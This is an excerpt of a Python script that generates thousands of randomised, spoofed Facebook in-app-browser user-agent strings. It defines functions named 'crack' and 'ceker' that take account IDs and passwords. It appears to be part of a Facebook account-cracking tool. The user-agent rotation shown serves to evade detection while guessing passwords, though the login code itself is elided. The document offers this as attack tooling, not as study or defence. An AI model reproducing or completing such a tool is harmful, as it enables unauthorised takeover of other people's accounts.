...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 9; EXODUS 1'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Build/PQ2A.190205.003; wv)'
	...
	k='Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 8.0.0; VS995'
	...
	l='Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/233.0.0.36.117;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 10; moto z4'
	...
	i='Build/QDFS30.130-42-5-2; wv)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/244.0.0.43.118;]'
...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (Linux; Android 8.0.0; LM-V350 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]'])
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/244.0.0.43.118;]'
